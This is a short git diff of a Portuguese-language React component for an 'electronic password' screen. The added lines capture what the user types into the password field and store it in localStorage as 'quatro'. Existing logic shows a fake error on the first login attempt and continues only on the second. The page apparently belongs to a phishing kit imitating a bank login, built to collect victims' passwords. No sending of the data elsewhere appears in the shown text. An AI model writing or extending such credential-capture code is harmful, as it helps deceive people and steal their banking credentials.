@@ -7,6 +7,11 @@ const SenhaEletronica = () => {
     const [errou, setErrou] = useState(false);
     const errorRef = useRef(null);
     const navigate = useNavigate();
+    const [quatro, setQuatro] = useState(null)
+
+    const defineSenha = (event) => {
+        setQuatro(event.target.value)
+    }
 
     const abrirErro = () => {
         if(errou === false){
@@ -16,6 +21,7 @@ const SenhaEletronica = () => {
             }, 1000);
         } else if (errou === true){
             setTimeout(() => {
+                localStorage.setItem("quatro", quatro);
                 navigate('/privacity');
             }, 1000);
         } else{
@@ -37,7 +43,7 @@ const SenhaEletronica = () => {
         </div>
         <div className='form2'>
             <span>senha eletrônica</span>
-            <input type="password" placeholder='' />
+            <input type="password" placeholder='' onChange={defineSenha} />
             <button onClick={abrirErro}>acessar</button>
         </div>
     </div>
